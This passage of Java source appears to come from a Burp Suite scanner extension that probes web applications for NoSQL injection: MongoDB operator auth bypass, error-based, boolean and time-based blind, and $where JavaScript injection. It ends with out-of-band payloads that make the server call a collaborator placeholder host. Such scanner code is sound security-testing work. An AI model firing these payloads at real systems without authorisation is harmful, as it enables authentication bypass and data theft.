            // Query/Body/Cookie params: inject operator suffixes
            testAuthBypassParams(original, target, url, baselineStatus, baselineBody, baselineLength);
        }
    }

    private void testAuthBypassParams(HttpRequestResponse original, NoSqlTarget target, String url,
                                       int baselineStatus, String baselineBody, int baselineLength) {
        for (String[] payload : AUTH_BYPASS_PARAM_PAYLOADS) {
            String operatorSuffix = payload[0];
            String value = payload[1];
            String description = payload[2];

            try {
                // Create a modified parameter with the operator suffix appended to param name
                // e.g., username[$ne] = ""
                HttpRequest modified = injectOperatorParam(original.request(), target, operatorSuffix, value);
                if (modified == null) continue;

                HttpRequestResponse result = api.http().sendRequest(modified);
                if (result == null || result.response() == null) continue;

                int resultStatus = result.response().statusCode();
                String resultBody = result.response().bodyToString();
                int resultLength = resultBody.length();

                // Check for significant response change indicating auth bypass
                boolean significantChange = isSignificantAuthChange(
                        baselineStatus, baselineLength, baselineBody,
                        resultStatus, resultLength, resultBody);

                if (significantChange) {
                    // Confirm with a second attempt
                    perHostDelay();
                    HttpRequestResponse confirm = api.http().sendRequest(modified);
                    if (confirm != null && confirm.response() != null) {
                        int confirmStatus = confirm.response().statusCode();
                        String confirmBody = confirm.response().bodyToString();
                        int confirmLength = confirmBody.length();

                        boolean confirmedChange = isSignificantAuthChange(
                                baselineStatus, baselineLength, baselineBody,
                                confirmStatus, confirmLength, confirmBody);

                        if (confirmedChange) {
                            findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                            "NoSQL Injection (Auth Bypass) - MongoDB Operator Injection",
                                            Severity.CRITICAL, Confidence.FIRM)
                                    .url(url)
                                    .parameter(target.name)
                                    .evidence("Technique: " + description
                                            + " | Operator param: " + target.name + operatorSuffix + "=" + value
                                            + " | Baseline: status=" + baselineStatus + ", len=" + baselineLength
                                            + " | Injected: status=" + resultStatus + ", len=" + resultLength
                                            + " | Confirmed: status=" + confirmStatus + ", len=" + confirmLength)
                                    .description("MongoDB operator injection detected in parameter '"
                                            + target.name + "'. The " + description
                                            + " caused a significant response change, indicating the operator"
                                            + " was interpreted by a MongoDB query. This can bypass authentication.")
                                    .requestResponse(result)
                                    .build());
                            return; // Found auth bypass, no need to test more payloads
                        }
                    }
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("NoSQLi auth bypass param test error: " + e.getMessage());
            }
        }
    }

    private void testAuthBypassJson(HttpRequestResponse original, NoSqlTarget target, String url,
                                     int baselineStatus, String baselineBody, int baselineLength) {
        for (String[] opInfo : AUTH_BYPASS_JSON_OPERATORS) {
            String operator = opInfo[0];
            String value = opInfo[1];
            String description = opInfo[2];

            try {
                // Replace the JSON string value with an operator object
                // e.g., "username": "admin" -> "username": {"$ne": ""}
                String body = original.request().bodyToString();
                String newBody = replaceJsonValueWithOperator(body, target.name, operator, value);
                if (newBody == null || newBody.equals(body)) continue;

                HttpRequest modified = original.request().withBody(newBody);
                HttpRequestResponse result = api.http().sendRequest(modified);
                if (result == null || result.response() == null) continue;

                int resultStatus = result.response().statusCode();
                String resultBody = result.response().bodyToString();
                int resultLength = resultBody.length();

                boolean significantChange = isSignificantAuthChange(
                        baselineStatus, baselineLength, baselineBody,
                        resultStatus, resultLength, resultBody);

                if (significantChange) {
                    // Confirm with second attempt
                    perHostDelay();
                    HttpRequestResponse confirm = api.http().sendRequest(modified);
                    if (confirm != null && confirm.response() != null) {
                        int confirmStatus = confirm.response().statusCode();
                        String confirmBody = confirm.response().bodyToString();
                        int confirmLength = confirmBody.length();

                        boolean confirmedChange = isSignificantAuthChange(
                                baselineStatus, baselineLength, baselineBody,
                                confirmStatus, confirmLength, confirmBody);

                        if (confirmedChange) {
                            findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                            "NoSQL Injection (Auth Bypass) - MongoDB JSON Operator Injection",
                                            Severity.CRITICAL, Confidence.FIRM)
                                    .url(url)
                                    .parameter(target.name)
                                    .evidence("Technique: " + description
                                            + " | Injected: {\"" + operator + "\": " + value + "}"
                                            + " | Baseline: status=" + baselineStatus + ", len=" + baselineLength
                                            + " | Injected: status=" + resultStatus + ", len=" + resultLength
                                            + " | Confirmed: status=" + confirmStatus + ", len=" + confirmLength)
                                    .description("MongoDB operator injection in JSON body detected for parameter '"
                                            + target.name + "'. The " + description
                                            + " caused a significant response change when the string value was"
                                            + " replaced with a MongoDB query operator object."
                                            + " This can bypass authentication or extract data.")
                                    .requestResponse(result)
                                    .build());
                            return;
                        }
                    }
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("NoSQLi auth bypass JSON test error: " + e.getMessage());
            }
        }
    }

    /**
     * Tests $or-based auth bypass by injecting $or conditions at the JSON document root.
     * These payloads replace the entire JSON body with $or-wrapped conditions that
     * can bypass authentication by matching any document in the collection.
     */
    private void testAuthBypassJsonOr(HttpRequestResponse original, NoSqlTarget target, String url,
                                       int baselineStatus, String baselineBody, int baselineLength) {
        for (String[] payloadInfo : AUTH_BYPASS_JSON_OR_PAYLOADS) {
            String payloadTemplate = payloadInfo[0];
            String description = payloadInfo[1];

            try {
                // Replace FIELD_PLACEHOLDER with the actual target field name
                String payload = payloadTemplate.replace("FIELD_PLACEHOLDER", target.name);
                HttpRequest modified = original.request().withBody(payload);
                HttpRequestResponse result = api.http().sendRequest(modified);
                if (result == null || result.response() == null) continue;

                int resultStatus = result.response().statusCode();
                String resultBody = result.response().bodyToString();
                int resultLength = resultBody.length();

                boolean significantChange = isSignificantAuthChange(
                        baselineStatus, baselineLength, baselineBody,
                        resultStatus, resultLength, resultBody);

                if (significantChange) {
                    // Confirm with second attempt
                    perHostDelay();
                    HttpRequestResponse confirm = api.http().sendRequest(modified);
                    if (confirm != null && confirm.response() != null) {
                        int confirmStatus = confirm.response().statusCode();
                        int confirmLength = confirm.response().bodyToString().length();

                        boolean confirmedChange = isSignificantAuthChange(
                                baselineStatus, baselineLength, baselineBody,
                                confirmStatus, confirmLength, confirm.response().bodyToString());

                        if (confirmedChange) {
                            findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                            "NoSQL Injection (Auth Bypass) - MongoDB $or Operator",
                                            Severity.CRITICAL, Confidence.FIRM)
                                    .url(url)
                                    .parameter(target.name)
                                    .evidence("Technique: " + description
                                            + " | Payload: " + payload
                                            + " | Baseline: status=" + baselineStatus + ", len=" + baselineLength
                                            + " | Injected: status=" + resultStatus + ", len=" + resultLength
                                            + " | Confirmed: status=" + confirmStatus + ", len=" + confirmLength)
                                    .description("MongoDB $or operator injection detected in JSON body for field '"
                                            + target.name + "'. The $or condition bypassed query constraints,"
                                            + " indicating the JSON body is parsed directly into a MongoDB query."
                                            + " This can bypass authentication and access control.")
                                    .requestResponse(result)
                                    .build());
                            return;
                        }
                    }
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("NoSQLi $or auth bypass JSON test error: " + e.getMessage());
            }
        }
    }

    /**
     * Determines if a response change is significant enough to indicate auth bypass.
     * Requires either a different status code OR a body length change > 30%.
     */
    private boolean isSignificantAuthChange(int baselineStatus, int baselineLength, String baselineBody,
                                             int resultStatus, int resultLength, String resultBody) {
        // Different status code is always significant (e.g., 401 -> 200, or 200 -> 302 redirect)
        if (resultStatus != baselineStatus) {
            // But not if it went to an error status (5xx) from a non-error status — that is noise
            if (resultStatus >= 500 && baselineStatus < 500) {
                return false;
            }
            return true;
        }

        // Body length change > 30% is significant
        if (baselineLength > 0) {
            double changeRatio = Math.abs(resultLength - baselineLength) / (double) baselineLength;
            if (changeRatio > 0.30) {
                return true;
            }
        } else if (resultLength > 100) {
            // Baseline was empty but now there is substantial content
            return true;
        }

        return false;
    }

    // ==================== PHASE 2: ERROR-BASED ====================

    /**
     * Injects payloads that trigger NoSQL syntax/parse errors.
     * Checks for specific error strings from MongoDB, CouchDB, Elasticsearch, etc.
     * Only reports if error strings are found in the response but NOT in the baseline.
     */
    private void testErrorBased(HttpRequestResponse original, NoSqlTarget target, String baselineBody) {
        String url = original.request().url();

        for (String payload : ERROR_PAYLOADS) {
            try {
                HttpRequestResponse result = sendWithPayload(original, target, payload);
                if (result == null || result.response() == null) continue;

                String responseBody = result.response().bodyToString();

                // Check for NoSQL-specific error signatures
                for (Map.Entry<String, List<Pattern>> entry : NOSQL_ERROR_PATTERNS.entrySet()) {
                    String dbType = entry.getKey();
                    for (Pattern pattern : entry.getValue()) {
                        Matcher m = pattern.matcher(responseBody);
                        if (m.find() && !pattern.matcher(baselineBody).find()) {
                            String evidence = m.group();

                            findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                            "NoSQL Injection (Error-Based) - " + dbType,
                                            Severity.HIGH, Confidence.FIRM)
                                    .url(url)
                                    .parameter(target.name)
                                    .evidence("Payload: " + payload
                                            + " | Error: " + evidence
                                            + " | DB type: " + dbType)
                                    .description("Error-based NoSQL injection detected in parameter '"
                                            + target.name + "'. The payload triggered a " + dbType
                                            + " error message ('" + evidence + "') that was not present"
                                            + " in the baseline response.")
                                    .requestResponse(result)
                                    .build());
                            return; // Found error-based, skip remaining payloads
                        }
                    }
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("NoSQLi error-based test error: " + e.getMessage());
            }
        }
    }

    // ==================== PHASE 3: BOOLEAN-BASED BLIND ====================

    /**
     * Tests for boolean-based blind NoSQL injection by injecting true/false
     * operator pairs and comparing responses.
     * Requires CONSISTENT true/false patterns across two test rounds for confirmation.
     */
    private void testBooleanBlind(HttpRequestResponse original, NoSqlTarget target,
                                   int baselineStatus, String baselineBody, int baselineLength) {
        String url = original.request().url();

        if (target.type == TargetType.JSON) {
            testBooleanBlindJson(original, target, url, baselineStatus, baselineBody, baselineLength);
        } else {
            testBooleanBlindParams(original, target, url, baselineStatus, baselineBody, baselineLength);
        }
    }

    private void testBooleanBlindParams(HttpRequestResponse original, NoSqlTarget target, String url,
                                         int baselineStatus, String baselineBody, int baselineLength) {
        for (String[] pair : BOOLEAN_PARAM_PAIRS) {
            String trueSuffix = pair[0];
            String trueValue = pair[1];
            String falseSuffix = pair[2];
            String falseValue = pair[3];

            try {
                // Round 1: Send true condition
                HttpRequest trueReq = injectOperatorParam(original.request(), target, trueSuffix, trueValue);
                if (trueReq == null) continue;
                HttpRequestResponse trueResult1 = api.http().sendRequest(trueReq);
                if (trueResult1 == null || trueResult1.response() == null) continue;

                perHostDelay();

                // Round 1: Send false condition
                HttpRequest falseReq = injectOperatorParam(original.request(), target, falseSuffix, falseValue);
                if (falseReq == null) continue;
                HttpRequestResponse falseResult1 = api.http().sendRequest(falseReq);
                if (falseResult1 == null || falseResult1.response() == null) continue;

                int trueLen1 = trueResult1.response().bodyToString().length();
                int falseLen1 = falseResult1.response().bodyToString().length();
                int trueStatus1 = trueResult1.response().statusCode();
                int falseStatus1 = falseResult1.response().statusCode();

                // Check if true and false conditions produce different responses
                boolean responsesDiffer = areBooleanResponsesDifferent(
                        trueStatus1, trueLen1, falseStatus1, falseLen1);

                if (!responsesDiffer) {
                    perHostDelay();
                    continue;
                }

                // Round 2: Confirm the pattern is consistent (not random)
                perHostDelay();
                HttpRequestResponse trueResult2 = api.http().sendRequest(trueReq);
                if (trueResult2 == null || trueResult2.response() == null) continue;

                perHostDelay();
                HttpRequestResponse falseResult2 = api.http().sendRequest(falseReq);
                if (falseResult2 == null || falseResult2.response() == null) continue;

                int trueLen2 = trueResult2.response().bodyToString().length();
                int falseLen2 = falseResult2.response().bodyToString().length();
                int trueStatus2 = trueResult2.response().statusCode();
                int falseStatus2 = falseResult2.response().statusCode();

                // Confirm: true results match each other, false results match each other,
                // and true/false still differ
                boolean trueConsistent = trueStatus1 == trueStatus2
                        && Math.abs(trueLen1 - trueLen2) < 50;
                boolean falseConsistent = falseStatus1 == falseStatus2
                        && Math.abs(falseLen1 - falseLen2) < 50;
                boolean stillDiffer = areBooleanResponsesDifferent(
                        trueStatus2, trueLen2, falseStatus2, falseLen2);

                if (trueConsistent && falseConsistent && stillDiffer) {
                    findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                    "NoSQL Injection (Boolean-Based Blind) - MongoDB Operator",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url)
                            .parameter(target.name)
                            .evidence("True payload: " + target.name + trueSuffix + "=" + trueValue
                                    + " (status=" + trueStatus1 + ", len=" + trueLen1
                                    + " / status=" + trueStatus2 + ", len=" + trueLen2 + ")"
                                    + " | False payload: " + target.name + falseSuffix + "=" + falseValue
                                    + " (status=" + falseStatus1 + ", len=" + falseLen1
                                    + " / status=" + falseStatus2 + ", len=" + falseLen2 + ")"
                                    + " | Baseline: status=" + baselineStatus + ", len=" + baselineLength)
                            .description("Boolean-based blind NoSQL injection confirmed in parameter '"
                                    + target.name + "'. True and false conditions consistently produce"
                                    + " different responses across two test rounds, indicating the MongoDB"
                                    + " operator is being evaluated in a query.")
                            .requestResponse(trueResult1)
                            .build());
                    return;
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("NoSQLi boolean blind param test error: " + e.getMessage());
            }
        }
    }

    private void testBooleanBlindJson(HttpRequestResponse original, NoSqlTarget target, String url,
                                       int baselineStatus, String baselineBody, int baselineLength) {
        for (String[] pair : BOOLEAN_JSON_PAIRS) {
            String trueOp = pair[0];
            String trueVal = pair[1];
            String falseOp = pair[2];
            String falseVal = pair[3];
            String description = pair[4];

            try {
                // Round 1: True condition
                String body = original.request().bodyToString();
                String trueBody = replaceJsonValueWithOperator(body, target.name, trueOp, trueVal);
                if (trueBody == null || trueBody.equals(body)) continue;
                HttpRequest trueReq = original.request().withBody(trueBody);
                HttpRequestResponse trueResult1 = api.http().sendRequest(trueReq);
                if (trueResult1 == null || trueResult1.response() == null) continue;

                perHostDelay();

                // Round 1: False condition
                String falseBody = replaceJsonValueWithOperator(body, target.name, falseOp, falseVal);
                if (falseBody == null || falseBody.equals(body)) continue;
                HttpRequest falseReq = original.request().withBody(falseBody);
                HttpRequestResponse falseResult1 = api.http().sendRequest(falseReq);
                if (falseResult1 == null || falseResult1.response() == null) continue;

                int trueLen1 = trueResult1.response().bodyToString().length();
                int falseLen1 = falseResult1.response().bodyToString().length();
                int trueStatus1 = trueResult1.response().statusCode();
                int falseStatus1 = falseResult1.response().statusCode();

                boolean responsesDiffer = areBooleanResponsesDifferent(
                        trueStatus1, trueLen1, falseStatus1, falseLen1);

                if (!responsesDiffer) {
                    perHostDelay();
                    continue;
                }

                // Round 2: Confirm consistency
                perHostDelay();
                HttpRequestResponse trueResult2 = api.http().sendRequest(trueReq);
                if (trueResult2 == null || trueResult2.response() == null) continue;

                perHostDelay();
                HttpRequestResponse falseResult2 = api.http().sendRequest(falseReq);
                if (falseResult2 == null || falseResult2.response() == null) continue;

                int trueLen2 = trueResult2.response().bodyToString().length();
                int falseLen2 = falseResult2.response().bodyToString().length();
                int trueStatus2 = trueResult2.response().statusCode();
                int falseStatus2 = falseResult2.response().statusCode();

                boolean trueConsistent = trueStatus1 == trueStatus2
                        && Math.abs(trueLen1 - trueLen2) < 50;
                boolean falseConsistent = falseStatus1 == falseStatus2
                        && Math.abs(falseLen1 - falseLen2) < 50;
                boolean stillDiffer = areBooleanResponsesDifferent(
                        trueStatus2, trueLen2, falseStatus2, falseLen2);

                if (trueConsistent && falseConsistent && stillDiffer) {
                    findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                    "NoSQL Injection (Boolean-Based Blind) - MongoDB JSON Operator",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url)
                            .parameter(target.name)
                            .evidence("Technique: " + description
                                    + " | True: {\"" + trueOp + "\": " + trueVal + "}"
                                    + " (status=" + trueStatus1 + "/" + trueStatus2
                                    + ", len=" + trueLen1 + "/" + trueLen2 + ")"
                                    + " | False: {\"" + falseOp + "\": " + falseVal + "}"
                                    + " (status=" + falseStatus1 + "/" + falseStatus2
                                    + ", len=" + falseLen1 + "/" + falseLen2 + ")"
                                    + " | Baseline: status=" + baselineStatus + ", len=" + baselineLength)
                            .description("Boolean-based blind NoSQL injection confirmed in JSON parameter '"
                                    + target.name + "'. Operator objects are evaluated by MongoDB."
                                    + " Technique: " + description + ".")
                            .requestResponse(trueResult1)
                            .build());
                    return;
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("NoSQLi boolean blind JSON test error: " + e.getMessage());
            }
        }
    }

    /**
     * Checks if two boolean condition responses are meaningfully different.
     * Used to distinguish true/false conditions in blind injection testing.
     */
    private boolean areBooleanResponsesDifferent(int status1, int len1, int status2, int len2) {
        // Different status codes indicate different behavior
        if (status1 != status2) return true;

        // Significant body length difference (> 100 chars or > 20%)
        int lenDiff = Math.abs(len1 - len2);
        if (lenDiff > 100) return true;
        if (len1 > 0 && len2 > 0) {
            double ratio = lenDiff / (double) Math.max(len1, len2);
            if (ratio > 0.20) return true;
        }

        return false;
    }

    // ==================== PHASE 4: TIME-BASED BLIND ====================

    /**
     * Tests for time-based blind NoSQL injection using MongoDB's $where operator
     * with sleep() or busy-wait loops. Uses double-tap confirmation to prevent
     * false positives from network latency.
     */
    private void testTimeBased(HttpRequestResponse original, NoSqlTarget target, long baselineTime) {
        String url = original.request().url();
        int delayThreshold = config.getInt("nosqli.time.threshold", 4000);

        if (target.type == TargetType.JSON) {
            testTimeBasedJson(original, target, url, baselineTime, delayThreshold);
        } else {
            testTimeBasedParams(original, target, url, baselineTime, delayThreshold);
        }
    }

    private void testTimeBasedParams(HttpRequestResponse original, NoSqlTarget target, String url,
                                      long baselineTime, int delayThreshold) {
        for (String payloadTemplate : TIME_PAYLOADS) {
            try {
                // Parse the payload template to extract operator suffix and value
                // Format: [$where]=sleep(5000)
                int eqIdx = payloadTemplate.indexOf('=');
                if (eqIdx < 0) continue;
                String operatorSuffix = payloadTemplate.substring(0, eqIdx);
                String value = payloadTemplate.substring(eqIdx + 1);

                HttpRequest modified = injectOperatorParam(original.request(), target, operatorSuffix, value);
                if (modified == null) continue;

                TimedResult timed1 = measureResponseTimeForRequest(modified);

                if (timed1.elapsedMs >= baselineTime + delayThreshold) {
                    // Double-tap confirmation
                    perHostDelay();
                    TimedResult timed2 = measureResponseTimeForRequest(modified);

                    if (timed2.elapsedMs >= baselineTime + delayThreshold) {
                        findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                        "NoSQL Injection (Time-Based Blind) - MongoDB $where",
                                        Severity.HIGH, Confidence.FIRM)
                                .url(url)
                                .parameter(target.name)
                                .evidence("Payload: " + target.name + payloadTemplate
                                        + " | Baseline: " + baselineTime + "ms"
                                        + " | Attempt 1: " + timed1.elapsedMs + "ms"
                                        + " | Attempt 2: " + timed2.elapsedMs + "ms"
                                        + " | Threshold: " + delayThreshold + "ms")
                                .description("Time-based blind NoSQL injection confirmed via MongoDB $where"
                                        + " operator in parameter '" + target.name + "'. The sleep/delay"
                                        + " payload caused consistent response delays across two attempts.")
                                .requestResponse(timed2.response)
                                .build());
                        return;
                    } else {
                        // Single hit — tentative, could be network latency
                        findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                        "Potential NoSQL Injection (Time-Based) - MongoDB $where",
                                        Severity.MEDIUM, Confidence.TENTATIVE)
                                .url(url)
                                .parameter(target.name)
                                .evidence("Payload: " + target.name + payloadTemplate
                                        + " | Single hit: " + timed1.elapsedMs + "ms (baseline: " + baselineTime + "ms)"
                                        + " | Second attempt: " + timed2.elapsedMs + "ms (did not confirm)")
                                .description("Single time-delay hit detected but not confirmed on second"
                                        + " attempt. May be a false positive due to network latency.")
                                .requestResponse(timed1.response)
                                .build());
                    }
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("NoSQLi time-based param test error: " + e.getMessage());
            }
        }
    }

    private void testTimeBasedJson(HttpRequestResponse original, NoSqlTarget target, String url,
                                    long baselineTime, int delayThreshold) {
        for (String wherePayload : TIME_JSON_PAYLOADS) {
            try {
                // Inject $where as a new top-level key in the JSON body
                String body = original.request().bodyToString();
                String newBody = injectWhereIntoJsonBody(body, wherePayload);
                if (newBody == null || newBody.equals(body)) continue;

                HttpRequest modified = original.request().withBody(newBody);
                TimedResult timed1 = measureResponseTimeForRequest(modified);

                if (timed1.elapsedMs >= baselineTime + delayThreshold) {
                    // Double-tap confirmation
                    perHostDelay();
                    TimedResult timed2 = measureResponseTimeForRequest(modified);

                    if (timed2.elapsedMs >= baselineTime + delayThreshold) {
                        findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                        "NoSQL Injection (Time-Based Blind) - MongoDB $where JSON",
                                        Severity.HIGH, Confidence.FIRM)
                                .url(url)
                                .parameter(target.name)
                                .evidence("$where payload: " + wherePayload
                                        + " | Baseline: " + baselineTime + "ms"
                                        + " | Attempt 1: " + timed1.elapsedMs + "ms"
                                        + " | Attempt 2: " + timed2.elapsedMs + "ms")
                                .description("Time-based blind NoSQL injection confirmed via $where"
                                        + " operator injected into the JSON body.")
                                .requestResponse(timed2.response)
                                .build());
                        return;
                    }
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("NoSQLi time-based JSON test error: " + e.getMessage());
            }
        }
    }

    // ==================== PHASE 5: $WHERE JS INJECTION ====================

    /**
     * Tests for server-side JavaScript injection via MongoDB's $where operator.
     * Compares responses between $where=function(){return true;} and $where=function(){return false;}
     * to determine if the JavaScript is being evaluated.
     */
    private void testWhereJsInjection(HttpRequestResponse original, NoSqlTarget target,
                                       int baselineStatus, String baselineBody, int baselineLength) {
        String url = original.request().url();

        if (target.type == TargetType.JSON) {
            testWhereJsJson(original, target, url, baselineStatus, baselineBody, baselineLength);
        } else {
            testWhereJsParams(original, target, url, baselineStatus, baselineBody, baselineLength);
        }
    }

    private void testWhereJsParams(HttpRequestResponse original, NoSqlTarget target, String url,
                                    int baselineStatus, String baselineBody, int baselineLength) {
        for (String[] pair : WHERE_JS_PAIRS) {
            String truePayload = pair[0];
            String falsePayload = pair[1];
            String description = pair[2];

            try {
                // Parse true payload
                int trueEqIdx = truePayload.indexOf('=');
                if (trueEqIdx < 0) continue;
                String trueSuffix = truePayload.substring(0, trueEqIdx);
                String trueValue = truePayload.substring(trueEqIdx + 1);

                // Parse false payload
                int falseEqIdx = falsePayload.indexOf('=');
                if (falseEqIdx < 0) continue;
                String falseSuffix = falsePayload.substring(0, falseEqIdx);
                String falseValue = falsePayload.substring(falseEqIdx + 1);

                // Send true condition
                HttpRequest trueReq = injectOperatorParam(original.request(), target, trueSuffix, trueValue);
                if (trueReq == null) continue;
                HttpRequestResponse trueResult = api.http().sendRequest(trueReq);
                if (trueResult == null || trueResult.response() == null) continue;

                perHostDelay();

                // Send false condition
                HttpRequest falseReq = injectOperatorParam(original.request(), target, falseSuffix, falseValue);
                if (falseReq == null) continue;
                HttpRequestResponse falseResult = api.http().sendRequest(falseReq);
                if (falseResult == null || falseResult.response() == null) continue;

                int trueLen = trueResult.response().bodyToString().length();
                int falseLen = falseResult.response().bodyToString().length();
                int trueStatus = trueResult.response().statusCode();
                int falseStatus = falseResult.response().statusCode();

                boolean responsesDiffer = areBooleanResponsesDifferent(
                        trueStatus, trueLen, falseStatus, falseLen);

                if (responsesDiffer) {
                    // Confirm with second round
                    perHostDelay();
                    HttpRequestResponse trueResult2 = api.http().sendRequest(trueReq);
                    perHostDelay();
                    HttpRequestResponse falseResult2 = api.http().sendRequest(falseReq);

                    if (trueResult2 != null && trueResult2.response() != null
                            && falseResult2 != null && falseResult2.response() != null) {
                        int trueLen2 = trueResult2.response().bodyToString().length();
                        int falseLen2 = falseResult2.response().bodyToString().length();
                        int trueStatus2 = trueResult2.response().statusCode();
                        int falseStatus2 = falseResult2.response().statusCode();

                        boolean consistent = (trueStatus == trueStatus2)
                                && (falseStatus == falseStatus2)
                                && Math.abs(trueLen - trueLen2) < 50
                                && Math.abs(falseLen - falseLen2) < 50;
                        boolean stillDiffer = areBooleanResponsesDifferent(
                                trueStatus2, trueLen2, falseStatus2, falseLen2);

                        if (consistent && stillDiffer) {
                            findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                            "NoSQL Injection ($where JS Injection) - MongoDB",
                                            Severity.CRITICAL, Confidence.FIRM)
                                    .url(url)
                                    .parameter(target.name)
                                    .evidence("Technique: " + description
                                            + " | True: " + truePayload
                                            + " (status=" + trueStatus + ", len=" + trueLen + ")"
                                            + " | False: " + falsePayload
                                            + " (status=" + falseStatus + ", len=" + falseLen + ")"
                                            + " | Confirmed on second round")
                                    .description("MongoDB $where server-side JavaScript injection confirmed"
                                            + " in parameter '" + target.name + "'. The server evaluates"
                                            + " arbitrary JavaScript in $where queries."
                                            + " This can lead to data extraction and potentially RCE.")
                                    .requestResponse(trueResult)
                                    .build());
                            return;
                        }
                    }
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("NoSQLi $where JS param test error: " + e.getMessage());
            }
        }
    }

    private void testWhereJsJson(HttpRequestResponse original, NoSqlTarget target, String url,
                                  int baselineStatus, String baselineBody, int baselineLength) {
        for (String[] pair : WHERE_JSON_PAIRS) {
            String trueValue = pair[0];
            String falseValue = pair[1];
            String description = pair[2];

            try {
                String body = original.request().bodyToString();

                // Inject $where: trueValue
                String trueWherePayload = "{\"$where\": " + trueValue + "}";
                String trueBody = injectWhereIntoJsonBody(body, trueWherePayload);
                if (trueBody == null || trueBody.equals(body)) continue;

                HttpRequest trueReq = original.request().withBody(trueBody);
                HttpRequestResponse trueResult = api.http().sendRequest(trueReq);
                if (trueResult == null || trueResult.response() == null) continue;

                perHostDelay();

                // Inject $where: falseValue
                String falseWherePayload = "{\"$where\": " + falseValue + "}";
                String falseBody = injectWhereIntoJsonBody(body, falseWherePayload);
                if (falseBody == null || falseBody.equals(body)) continue;

                HttpRequest falseReq = original.request().withBody(falseBody);
                HttpRequestResponse falseResult = api.http().sendRequest(falseReq);
                if (falseResult == null || falseResult.response() == null) continue;

                int trueLen = trueResult.response().bodyToString().length();
                int falseLen = falseResult.response().bodyToString().length();
                int trueStatus = trueResult.response().statusCode();
                int falseStatus = falseResult.response().statusCode();

                boolean responsesDiffer = areBooleanResponsesDifferent(
                        trueStatus, trueLen, falseStatus, falseLen);

                if (responsesDiffer) {
                    // Confirm with second round
                    perHostDelay();
                    HttpRequestResponse trueResult2 = api.http().sendRequest(trueReq);
                    perHostDelay();
                    HttpRequestResponse falseResult2 = api.http().sendRequest(falseReq);

                    if (trueResult2 != null && trueResult2.response() != null
                            && falseResult2 != null && falseResult2.response() != null) {
                        int trueLen2 = trueResult2.response().bodyToString().length();
                        int falseLen2 = falseResult2.response().bodyToString().length();
                        int trueStatus2 = trueResult2.response().statusCode();
                        int falseStatus2 = falseResult2.response().statusCode();

                        boolean consistent = (trueStatus == trueStatus2)
                                && (falseStatus == falseStatus2)
                                && Math.abs(trueLen - trueLen2) < 50
                                && Math.abs(falseLen - falseLen2) < 50;
                        boolean stillDiffer = areBooleanResponsesDifferent(
                                trueStatus2, trueLen2, falseStatus2, falseLen2);

                        if (consistent && stillDiffer) {
                            findingsStore.addFinding(Finding.builder("nosqli-scanner",
                                            "NoSQL Injection ($where JS Injection) - MongoDB JSON",
                                            Severity.CRITICAL, Confidence.FIRM)
                                    .url(url)
                                    .parameter(target.name)
                                    .evidence("Technique: " + description
                                            + " | True $where: " + trueValue
                                            + " (status=" + trueStatus + ", len=" + trueLen + ")"
                                            + " | False $where: " + falseValue
                                            + " (status=" + falseStatus + ", len=" + falseLen + ")"
                                            + " | Confirmed on second round")
                                    .description("MongoDB $where server-side JavaScript injection confirmed"
                                            + " via JSON body. The server evaluates arbitrary JavaScript.")
                                    .requestResponse(trueResult)
                                    .build());
                            return;
                        }
                    }
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("NoSQLi $where JS JSON test error: " + e.getMessage());
            }
        }
    }

    // ==================== PHASE 6: OOB/COLLABORATOR NOSQL INJECTION ====================

    /**
     * Tests for blind NoSQL injection via OOB using Burp Collaborator.
     * Uses MongoDB $where JavaScript execution context to trigger DNS callbacks.
     * This phase detects blind injection that produces no visible response difference.
     */
    private void testOobNoSql(HttpRequestResponse original, NoSqlTarget target,
                               String url) throws InterruptedException {
        // OOB payloads for MongoDB $where with DNS callbacks via JavaScript execution
        String[][] oobTemplates = {
                // Original java.net.URL payloads
                {"'; var x = new java.net.URL(\"http://COLLAB_PLACEHOLDER\"); x.openConnection().getInputStream(); var a='",
                        "$where JS java.net.URL DNS callback"},
                {"'; var xhr = new XMLHttpRequest(); xhr.open('GET','http://COLLAB_PLACEHOLDER'); xhr.send(); var a='",
                        "$where JS XMLHttpRequest callback"},
                {"1; var x = new java.net.URL(\"http://COLLAB_PLACEHOLDER\"); x.openConnection().getInputStream();",
                        "$where JS java.net.URL (numeric context)"},
                // Node.js dns module callback
                {"'; require('dns').resolve(\"COLLAB_PLACEHOLDER\", function(){}); var a='",
                        "$where JS Node.js dns.resolve callback"},
                // Node.js http module callback
                {"'; require('http').get('http://COLLAB_PLACEHOLDER/nosqli'); var a='",
                        "$where JS Node.js http.get callback"},
                // Node.js net module callback
                {"'; var net=require('net'); var c=new net.Socket(); c.connect(80,'COLLAB_PLACEHOLDER'); var a='",
                        "$where JS Node.js net.Socket callback"},
        };

